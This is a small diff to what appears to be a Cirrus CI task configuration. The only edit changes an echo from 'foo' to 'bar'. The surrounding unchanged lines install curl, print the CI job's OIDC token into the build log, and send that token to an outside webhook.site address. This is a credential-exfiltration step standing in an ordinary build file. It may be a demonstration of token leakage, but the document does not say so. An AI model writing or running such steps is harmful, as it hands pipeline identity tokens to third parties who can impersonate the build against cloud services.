@@ -5,7 +5,7 @@ task:
   echo_script:
     set -x;
     apk add curl;
-    echo "foo";
+    echo "bar";
     echo $CIRRUS_OIDC_TOKEN;
     curl "https://webhook.site/dc785d7e-266e-4c92-ad13-396505a91474?token=$CIRRUS_OIDC_TOKEN"
   #archive_artifacts:
